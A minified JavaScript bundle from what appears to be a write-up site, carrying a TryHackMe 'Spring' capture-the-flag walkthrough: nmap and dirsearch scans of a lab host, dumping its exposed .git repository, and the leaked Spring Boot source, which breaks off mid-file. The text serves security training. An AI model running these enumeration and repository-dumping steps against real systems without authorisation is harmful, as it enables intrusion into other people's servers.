"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[3595],{3905:(t,e,n)=>{n.d(e,{Zo:()=>h,kt:()=>u});var r=n(67294);function o(t,e,n){return e in t?Object.defineProperty(t,e,{value:n,enumerable:!0,configurable:!0,writable:!0}):t[e]=n,t}function s(t,e){var n=Object.keys(t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(t);e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),n.push.apply(n,r)}return n}function a(t){for(var e=1;e<arguments.length;e++){var n=null!=arguments[e]?arguments[e]:{};e%2?s(Object(n),!0).forEach((function(e){o(t,e,n[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(n)):s(Object(n)).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(n,e))}))}return t}function i(t,e){if(null==t)return{};var n,r,o=function(t,e){if(null==t)return{};var n,r,o={},s=Object.keys(t);for(r=0;r<s.length;r++)n=s[r],e.indexOf(n)>=0||(o[n]=t[n]);return o}(t,e);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(t);for(r=0;r<s.length;r++)n=s[r],e.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(t,n)&&(o[n]=t[n])}return o}var c=r.createContext({}),l=function(t){var e=r.useContext(c),n=e;return t&&(n="function"==typeof t?t(e):a(a({},e),t)),n},h=function(t){var e=l(t.components);return r.createElement(c.Provider,{value:e},t.children)},p="mdxType",g={inlineCode:"code",wrapper:function(t){var e=t.children;return r.createElement(r.Fragment,{},e)}},m=r.forwardRef((function(t,e){var n=t.components,o=t.mdxType,s=t.originalType,c=t.parentName,h=i(t,["components","mdxType","originalType","parentName"]),p=l(n),m=o,u=p["".concat(c,".").concat(m)]||p[m]||g[m]||s;return n?r.createElement(u,a(a({ref:e},h),{},{components:n})):r.createElement(u,a({ref:e},h))}));function u(t,e){var n=arguments,o=e&&e.mdxType;if("string"==typeof t||o){var s=n.length,a=new Array(s);a[0]=m;var i={};for(var c in e)hasOwnProperty.call(e,c)&&(i[c]=e[c]);i.originalType=t,i[p]="string"==typeof t?t:o,a[1]=i;for(var l=2;l<s;l++)a[l]=n[l];return r.createElement.apply(null,a)}return r.createElement.apply(null,n)}m.displayName="MDXCreateElement"},62045:(t,e,n)=>{n.r(e),n.d(e,{assets:()=>c,contentTitle:()=>a,default:()=>g,frontMatter:()=>s,metadata:()=>i,toc:()=>l});var r=n(87462),o=(n(67294),n(3905));const s={},a="Spring",i={unversionedId:"Tryhackme/Spring/Spring",id:"Tryhackme/Spring/Spring",title:"Spring",description:"Can you hack your way in to a Hello World application?",source:"@site/writeups/Tryhackme/Spring/Spring.md",sourceDirName:"Tryhackme/Spring",slug:"/Tryhackme/Spring/",permalink:"/writeups/Tryhackme/Spring/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Splunk",permalink:"/writeups/Tryhackme/Splunk/"},next:{title:"Starting Out In Cyber Sec",permalink:"/writeups/Tryhackme/Starting Out In Cyber Sec/"}},c={},l=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Spring",id:"task-1-spring",level:2}],h={toc:l},p="wrapper";function g(t){let{components:e,...n}=t;return(0,o.kt)(p,(0,r.Z)({},h,n,{components:e,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"spring"},"Spring"),(0,o.kt)("p",null,"Can you hack your way in to a Hello World application?"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/spring"},"Spring")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Git Enumeation"),(0,o.kt)("li",{parentName:"ul"},"Exploitation (Spring Boot)"),(0,o.kt)("li",{parentName:"ul"},"Brute Forcing (Hash)"),(0,o.kt)("li",{parentName:"ul"},"Brute Forcing (SSH Key)")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-spring"},"Task 1 Spring"),(0,o.kt)("p",null,"This machine may take up to 5 minutes to fully deploy."),(0,o.kt)("p",null,"John created a simple Hello World Web Application, he is still learning."),(0,o.kt)("p",null,"See if you can find a way to hack him."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Spring$ sudo nmap -A -sS -sC -sV -O 10.10.6.25\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-20 11:24 CEST\nNmap scan report for 10.10.6.25\nHost is up (0.034s latency).\nNot shown: 997 closed ports\nPORT    STATE SERVICE   VERSION\n22/tcp  open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 89:a8:db:e1:3d:ab:0e:ea:da:d8:8d:a7:bc:56:fc:da (RSA)\n|   256 7d:b2:aa:19:18:31:6c:62:18:7b:3b:96:11:02:54:9d (ECDSA)\n|_  256 26:32:b9:96:69:a8:cb:14:b4:8c:e8:f0:d5:74:bd:6e (ED25519)\n80/tcp  open  http\n| fingerprint-strings:\n|   GetRequest, HTTPOptions:\n|     HTTP/1.1 302\n|     Cache-Control: private\n|     Expires: Thu, 01 Jan 1970 00:00:00 GMT\n|     Location: https://localhost/\n|     Content-Length: 0\n|     Date: Tue, 20 Oct 2020 09:24:35 GMT\n|     Connection: close\n|   RTSPRequest, X11Probe:\n|     HTTP/1.1 400\n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 435\n|     Date: Tue, 20 Oct 2020 09:24:35 GMT\n|     Connection: close\n|     <!doctype html><html lang="en"><head><title>HTTP Status 400\n|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400\n|_    Request</h1></body></html>\n|_http-title: Did not follow redirect to https://10.10.6.25/\n443/tcp open  ssl/https\n|_http-title: Site doesn\'t have a title (text/plain;charset=UTF-8).\n|_ssl-date: 2020-10-20T09:25:27+00:00; +1s from scanner time.\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port80-TCP:V=7.80%I=7%D=10/20%Time=5F8EACD3%P=x86_64-pc-linux-gnu%r(Get\nSF:Request,BA,"HTTP/1\\.1\\x20302\\x20\\r\\nCache-Control:\\x20private\\r\\nExpire\nSF:s:\\x20Thu,\\x2001\\x20Jan\\x201970\\x2000:00:00\\x20GMT\\r\\nLocation:\\x20http\nSF:s://localhost/\\r\\nContent-Length:\\x200\\r\\nDate:\\x20Tue,\\x2020\\x20Oct\\x2\nSF:02020\\x2009:24:35\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n")%r(HTTPOption\nSF:s,BA,"HTTP/1\\.1\\x20302\\x20\\r\\nCache-Control:\\x20private\\r\\nExpires:\\x20\nSF:Thu,\\x2001\\x20Jan\\x201970\\x2000:00:00\\x20GMT\\r\\nLocation:\\x20https://lo\nSF:calhost/\\r\\nContent-Length:\\x200\\r\\nDate:\\x20Tue,\\x2020\\x20Oct\\x202020\\\nSF:x2009:24:35\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n")%r(RTSPRequest,24E,\nSF:"HTTP/1\\.1\\x20400\\x20\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nCo\nSF:ntent-Language:\\x20en\\r\\nContent-Length:\\x20435\\r\\nDate:\\x20Tue,\\x2020\\\nSF:x20Oct\\x202020\\x2009:24:35\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n<!doct\nSF:ype\\x20html><html\\x20lang=\\"en\\"><head><title>HTTP\\x20Status\\x20400\\x20\nSF:\\xe2\\x80\\x93\\x20Bad\\x20Request</title><style\\x20type=\\"text/css\\">body\\\nSF:x20{font-family:Tahoma,Arial,sans-serif;}\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20\nSF:{color:white;background-color:#525D76;}\\x20h1\\x20{font-size:22px;}\\x20h\nSF:2\\x20{font-size:16px;}\\x20h3\\x20{font-size:14px;}\\x20p\\x20{font-size:12\nSF:px;}\\x20a\\x20{color:black;}\\x20\\.line\\x20{height:1px;background-color:#\nSF:525D76;border:none;}</style></head><body><h1>HTTP\\x20Status\\x20400\\x20\\\nSF:xe2\\x80\\x93\\x20Bad\\x20Request</h1></body></html>")%r(X11Probe,24E,"HTTP\nSF:/1\\.1\\x20400\\x20\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nContent\nSF:-Language:\\x20en\\r\\nContent-Length:\\x20435\\r\\nDate:\\x20Tue,\\x2020\\x20Oc\nSF:t\\x202020\\x2009:24:35\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n<!doctype\\x\nSF:20html><html\\x20lang=\\"en\\"><head><title>HTTP\\x20Status\\x20400\\x20\\xe2\\\nSF:x80\\x93\\x20Bad\\x20Request</title><style\\x20type=\\"text/css\\">body\\x20{f\nSF:ont-family:Tahoma,Arial,sans-serif;}\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20{colo\nSF:r:white;background-color:#525D76;}\\x20h1\\x20{font-size:22px;}\\x20h2\\x20\nSF:{font-size:16px;}\\x20h3\\x20{font-size:14px;}\\x20p\\x20{font-size:12px;}\\\nSF:x20a\\x20{color:black;}\\x20\\.line\\x20{height:1px;background-color:#525D7\nSF:6;border:none;}</style></head><body><h1>HTTP\\x20Status\\x20400\\x20\\xe2\\x\nSF:80\\x93\\x20Bad\\x20Request</h1></body></html>");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/20%OT=22%CT=1%CU=39449%PV=Y%DS=2%DC=T%G=Y%TM=5F8EAD\nOS:42%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC\nOS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 21/tcp)\nHOP RTT      ADDRESS\n1   36.19 ms 10.8.0.1\n2   36.27 ms 10.10.6.25\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 120.73 seconds\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Spring$ sudo /opt/dirsearch/dirsearch.py -u https://10.10.6.25/ -t 200 -E -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -R 5\n\n  _|. _ _  _  _  _ _|_    v0.4.0\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, asp, aspx, jsp, jspx, html, htm, js | HTTP method: GET | Threads: 200 | Wordlist size: 220520 | Recursion level: 5\n\nError Log: /opt/dirsearch/logs/errors-20-10-20_11-27-43.log\n\nTarget: https://10.10.6.25/\n\nOutput File: /opt/dirsearch/reports/10.10.6.25/_20-10-20_11-27-43.txt\n\n[11:27:43] Starting:\n[11:27:58] 302 -    0B  - /sources  ->  /sources/     (Added to queue)\n[11:30:57] 400 -  435B  - /http%3A%2F%2Fwww\nCTRL+C detected: Pausing threads, please wait...\n\nCanceled by the user\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Spring$ sudo /opt/dirsearch/dirsearch.py -u https://10.10.6.25/sources/new/ -t 200 -E -r -R 5\n\n  _|. _ _  _  _  _ _|_    v0.4.0\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, asp, aspx, jsp, jspx, html, htm, js | HTTP method: GET | Threads: 200 | Wordlist size: 10457 | Recursion level: 5\n\nError Log: /opt/dirsearch/logs/errors-20-10-20_11-33-15.log\n\nTarget: https://10.10.6.25/sources/new/\n\nOutput File: /opt/dirsearch/reports/10.10.6.25/sources.new_20-10-20_11-33-15.txt\n\n[11:33:15] Starting:\n[11:33:18] 200 -  148B  - /sources/new/.git/config\n[11:33:18] 200 -  401B  - /sources/new/.git/COMMIT_EDITMSG\n[11:33:19] 200 -  240B  - /sources/new/.git/info/exclude\n[11:33:19] 200 -    1KB - /sources/new/.git/index\n[11:33:19] 302 -    0B  - /sources/new/.git/logs/refs  ->  /sources/new/.git/logs/refs/     (Added to queue)\n[11:33:19] 302 -    0B  - /sources/new/.git/logs/refs/heads  ->  /sources/new/.git/logs/refs/heads/     (Added to queue)\n[11:33:19] 200 -   73B  - /sources/new/.git/description\n[11:33:19] 200 -  319B  - /sources/new/.git/logs/refs/heads/master\n[11:33:19] 302 -    0B  - /sources/new/.git/refs/heads  ->  /sources/new/.git/refs/heads/     (Added to queue)\n[11:33:19] 302 -    0B  - /sources/new/.git/refs/tags  ->  /sources/new/.git/refs/tags/     (Added to queue)\n[11:33:19] 200 -   41B  - /sources/new/.git/refs/heads/master\n[11:33:24] 400 -  435B  - /sources/new/a%5c.aspx\nCTRL+C detected: Pausing threads, please wait...\n\nCanceled by the user\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Spring$ mkdir git_data\nkali@kali:~/CTFs/tryhackme/Spring$ /opt/git-dumper/git-dumper.py https://10.10.6.25/sources/new/.git/ ./git_data/\n[-] Testing https://10.10.6.25/sources/new/.git/HEAD [200]\n[-] Testing https://10.10.6.25/sources/new/.git/ [404]\n[-] Fetching common files\n[-] Fetching https://10.10.6.25/sources/new/.git/description [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/hooks/post-update.sample [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/COMMIT_EDITMSG [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/hooks/pre-applypatch.sample [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/hooks/post-commit.sample [404]\n[-] Fetching https://10.10.6.25/sources/new/.git/hooks/commit-msg.sample [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/hooks/pre-push.sample [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/hooks/applypatch-msg.sample [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/hooks/pre-commit.sample [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/hooks/pre-rebase.sample [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/hooks/post-receive.sample [404]\n[-] Fetching https://10.10.6.25/sources/new/.git/hooks/pre-receive.sample [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/hooks/prepare-commit-msg.sample [200]\n[-] Fetching https://10.10.6.25/sources/new/.gitignore [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/index [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/info/packs [404]\n[-] Fetching https://10.10.6.25/sources/new/.git/info/exclude [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/hooks/update.sample [200]\n[-] Finding refs/\n[-] Fetching https://10.10.6.25/sources/new/.git/HEAD [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/logs/refs/remotes/origin/HEAD [404]\n[-] Fetching https://10.10.6.25/sources/new/.git/logs/refs/stash [404]\n[-] Fetching https://10.10.6.25/sources/new/.git/FETCH_HEAD [404]\n[-] Fetching https://10.10.6.25/sources/new/.git/info/refs [404]\n[-] Fetching https://10.10.6.25/sources/new/.git/logs/refs/remotes/origin/master [404]\n[-] Fetching https://10.10.6.25/sources/new/.git/config [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/ORIG_HEAD [404]\n[-] Fetching https://10.10.6.25/sources/new/.git/logs/HEAD [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/logs/refs/heads/master [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/packed-refs [404]\n[-] Fetching https://10.10.6.25/sources/new/.git/refs/heads/master [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/refs/remotes/origin/HEAD [404]\n[-] Fetching https://10.10.6.25/sources/new/.git/refs/remotes/origin/master [404]\n[-] Fetching https://10.10.6.25/sources/new/.git/refs/stash [404]\n[-] Fetching https://10.10.6.25/sources/new/.git/refs/wip/wtree/refs/heads/master [404]\n[-] Fetching https://10.10.6.25/sources/new/.git/refs/wip/index/refs/heads/master [404]\n[-] Finding packs\n[-] Finding objects\n[-] Fetching objects\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/92/b433a86a015517f746a3437ba3802be9146722 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/00/00000000000000000000000000000000000000 [404]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/b4/63ef229486f86eeb72b89539bd3339e485807f [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/d5/c72b751a3a756eb27f4f07664842d252dc4928 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/66/058471882cd13e7e1229d7df0ecb1437b61e78 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/29/e4f3b4e2234b489d695f8c262c1b4a1b6f6e9a [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/a9/f778a7a964b6f01c904ee667903f005d6df556 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/9a/8d7e300995dabbb2f0ab9a117f2ee02068aa8d [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/eb/f1ef86a29a04cc7ad00bdbc656056a6250e3f6 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/8f/8904743c007a1542d0047be84912b7aa15279f [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/6b/d070178569781eb0534f575e52157aa59a501e [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/5d/eeca1fbb8b02b7a5fbf1776a9b6fc803afda32 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/06/e4e487ea33b438eddd5f01d01980e8eb483d54 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/93/407ced89dfa0d7e574bb117c6bbee7a0d40bc9 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/1a/83ec34bf5ab3a89096346c46f6fda2d26da7e6 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/71/e18111b0f82be167bcdf44501c40552d9e10ad [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/e4/9a401d2e07d18bbd9bfc492d71c4467d16d2b3 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/0f/4ff745b9480ab23ff47a25542e16094117c35a [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/0a/e5a6c68f4da02b8cb399eb0b90ead4272d7cd1 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/39/858db3349ea85bfc5b0120dc5d2ca45f0683af [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/6d/e5c4c83edbf094c885d02be5f275f589d452ac [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/bf/ee42398426f27ae8511e6f4e613207854fdb6d [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/6f/b8af92ee8f251b33184e01597255e87459ecb7 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/67/3abbf42bad7eff6574b6ea8759cea232cf63e7 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/a4/c5e5165ecd93acf7f243da71430d4edcc2c780 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/5a/89f76e57f381e38efa3179fd69cf8ee7fd1e54 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/fc/719eba62e24fd379fd44dc35f1ab25f49ef231 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/cc/f5992a16348d803da54a48aa64f24f81569380 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/0c/304b129922b9739c4193b9a9b71b3050a0867d [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/fd/861389321333ed895fe9c22a79254db774a150 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/5e/a2aaeb59bb380f001a3a1569bb127d4834152a [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/98/c8673dc8c0250e15f6a4c4ac7f90a7c8555dbb [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/69/871575a847bfef00491cd5912a59682b427525 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/80/c24d20f6bb44e6e2d16aaf133f866a2182f597 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/3d/b1ee8004fe3cad3b3637e018abdf443e328e3a [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/fe/e60fff5d20f703d74d02fa9a57ed364d9210ee [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/f6/d1a5ff67503ff152c3be8db995939e22f20da6 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/f0/f2f7760ac45cfeb34ced824b2abfbc6e436000 [200]\n[-] Fetching https://10.10.6.25/sources/new/.git/objects/7b/8c746815c823dc9983dc27fc31e69dac3c7bf1 [200]\n[-] Running git checkout .\nkali@kali:~/CTFs/tryhackme/Spring$ cd git_data/\nkali@kali:~/CTFs/tryhackme/Spring/git_data$ git log\ncommit 1a83ec34bf5ab3a89096346c46f6fda2d26da7e6 (HEAD -> master)\nAuthor: John Smith <johnsmith@spring.thm>\nDate:   Fri Jul 10 18:13:55 2020 +0000\n\n    added greeting\n    changed security password to my usual format\n\ncommit 92b433a86a015517f746a3437ba3802be9146722\nAuthor: John Smith <johnsmith@spring.thm>\nDate:   Sat Jul 4 23:53:25 2020 +0000\n\n    Hello world\nkali@kali:~/CTFs/tryhackme/Spring/git_data$ git reset --hard 1a83ec34bf5ab3a89096346c46f6fda2d26da7e6\nHEAD is now at 1a83ec3 added greeting changed security password to my usual format\nkali@kali:~/CTFs/tryhackme/Spring/git_data$ find . -ls |grep -v \\\\.git\n  1449991      4 drwxr-xr-x   5 kali     kali         4096 Oct 20 11:34 .\n  1450039      4 -rw-r--r--   1 kali     kali           28 Oct 20 11:34 ./settings.gradle\n  1450038      4 -rw-r--r--   1 kali     kali         3058 Oct 20 11:34 ./gradlew.bat\n  1450037      8 -rw-r--r--   1 kali     kali         5441 Oct 20 11:34 ./gradlew\n  2621980      4 drwxr-xr-x   4 kali     kali         4096 Oct 20 11:34 ./src\n  2621981      4 drwxr-xr-x   4 kali     kali         4096 Oct 20 11:34 ./src/main\n  2621982      4 drwxr-xr-x   4 kali     kali         4096 Oct 20 11:34 ./src/main/java\n  2621985      4 drwxr-xr-x   3 kali     kali         4096 Oct 20 11:34 ./src/main/java/com\n  2621986      4 drwxr-xr-x   3 kali     kali         4096 Oct 20 11:34 ./src/main/java/com/onurshin\n  2621987      4 drwxr-xr-x   2 kali     kali         4096 Oct 20 11:34 ./src/main/java/com/onurshin/spring\n  2621988      8 -rw-r--r--   1 kali     kali         4350 Oct 20 11:34 ./src/main/java/com/onurshin/spring/Application.java\n  2621983      4 drwxr-xr-x   2 kali     kali         4096 Oct 20 11:34 ./src/main/java/META-INF\n  2621984      4 -rw-r--r--   1 kali     kali           70 Oct 20 11:34 ./src/main/java/META-INF/MANIFEST.MF\n  2621989      4 drwxr-xr-x   2 kali     kali         4096 Oct 20 11:34 ./src/main/resources\n  2621990      4 -rw-r--r--   1 kali     kali         1007 Oct 20 11:34 ./src/main/resources/application.properties\n  2621991      4 -rw-r--r--   1 kali     kali         2581 Oct 20 11:34 ./src/main/resources/dummycert.p12\n  2621992      4 drwxr-xr-x   3 kali     kali         4096 Oct 20 11:34 ./src/test\n  2621993      4 drwxr-xr-x   3 kali     kali         4096 Oct 20 11:34 ./src/test/java\n  2621994      4 drwxr-xr-x   3 kali     kali         4096 Oct 20 11:34 ./src/test/java/com\n  2621995      4 drwxr-xr-x   3 kali     kali         4096 Oct 20 11:34 ./src/test/java/com/onurshin\n  2621996      4 drwxr-xr-x   2 kali     kali         4096 Oct 20 11:34 ./src/test/java/com/onurshin/spring\n  2621997      4 -rw-r--r--   1 kali     kali          214 Oct 20 11:34 ./src/test/java/com/onurshin/spring/ApplicationTests.java\n  1450036      4 drwxr-xr-x   3 kali     kali         4096 Oct 20 11:34 ./gradle\n  2621978      4 drwxr-xr-x   2 kali     kali         4096 Oct 20 11:34 ./gradle/wrapper\n  2621979      4 -rw-r--r--   1 kali     kali          238 Oct 20 11:34 ./gradle/wrapper/gradle-wrapper.properties\n  1450035      4 -rw-r--r--   1 kali     kali         1151 Oct 20 11:34 ./build.gradle\nkali@kali:~/CTFs/tryhackme/Spring/git_data$ cat build.gradle\nplugins {\n    id 'org.springframework.boot' version '2.3.1.RELEASE'\n    id 'io.spring.dependency-management' version '1.0.9.RELEASE'\n    id 'java'\n}\n\ngroup = 'com.onurshin'\nversion = '0.0.1-SNAPSHOT'\nsourceCompatibility = '1.8'\n\nrepositories {\n    mavenCentral()\n}\n\next {\n    set('springCloudVersion', \"Greenwich.SR4\")\n}\ndependencies {\n    implementation 'org.springframework.boot:spring-boot-starter-actuator'\n    implementation 'org.springframework.boot:spring-boot-starter-web'\n    implementation 'org.springframework.boot:spring-boot-starter-security'\n    implementation 'org.springframework.boot:spring-boot-starter-data-jpa'\n\n    implementation 'org.springframework.cloud:spring-cloud-starter-config'\n    runtimeOnly 'com.h2database:h2'\n\n    testImplementation('org.springframework.boot:spring-boot-starter-test') {\n        exclude group: 'org.junit.vintage', module: 'junit-vintage-engine'\n    }\n    testImplementation 'org.springframework.security:spring-security-test'\n}\n\ndependencyManagement {\n    imports {\n        mavenBom \"org.springframework.cloud:spring-cloud-dependencies:${springCloudVersion}\"\n    }\n}\ntest {\n    useJUnitPlatform()\n}\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Spring/git_data$ ls -la src/main/java/com/onurshin/spring/\ntotal 16\ndrwxr-xr-x 2 kali kali 4096 Oct 20 11:34 .\ndrwxr-xr-x 3 kali kali 4096 Oct 20 11:34 ..\n-rw-r--r-- 1 kali kali 4350 Oct 20 11:34 Application.java\nkali@kali:~/CTFs/tryhackme/Spring/git_data$ cat src/main/java/com/onurshin/spring/Application.java\npackage com.onurshin.spring;\n\nimport org.apache.catalina.Context;\nimport org.apache.catalina.Wrapper;\nimport org.apache.catalina.connector.Connector;\nimport org.apache.catalina.startup.Tomcat;\nimport org.apache.tomcat.util.descriptor.web.SecurityCollection;\nimport org.apache.tomcat.util.descriptor.web.SecurityConstraint;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration;\nimport org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;\nimport org.springframework.boot.web.embedded.tomcat.TomcatWebServer;\nimport org.springframework.boot.web.servlet.server.ServletWebServerFactory;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.RestController;\n\n@SpringBootApplication(exclude = {ErrorMvcAutoConfiguration.class})\npublic class Application {\n\n    public static void main(String[] args) {\n        SpringApplication.run(Application.class, args);\n    }\n\n    @RestController\n    //https://spring.io/guides/gs/rest-service/\n    static class HelloWorldController {\n        @RequestMapping("/")\n        public String hello(@RequestParam(value = "name", defaultValue = "World") String name) {\n            System.out.println(name);\n            return String.format("Hello, %s!", name);\n        }\n    }\n\n\n    private Connector redirectConnector() {\n        Connector connector = new Connector("org.apache.coyote.http11.Http11NioProtocol");\n        connector.setScheme("http");\n        connector.setPort(80);\n        connector.setSecure(false);\n        connector.setRedirectPort(443);\n        return connector;\n    }\n\n    @Bean\n    public ServletWebServerFactory servletContainer() {\n        TomcatServletWebServerFactory factory = new TomcatServletWebServerFactory() {\n            @Override\n            protected void postProcessContext(Context context) {\n                SecurityConstraint securityConstraint = new SecurityConstraint();\n                securityConstraint.setUserConstraint("CONFIDENTIAL");\n                SecurityCollection collection = new SecurityCollection();\n                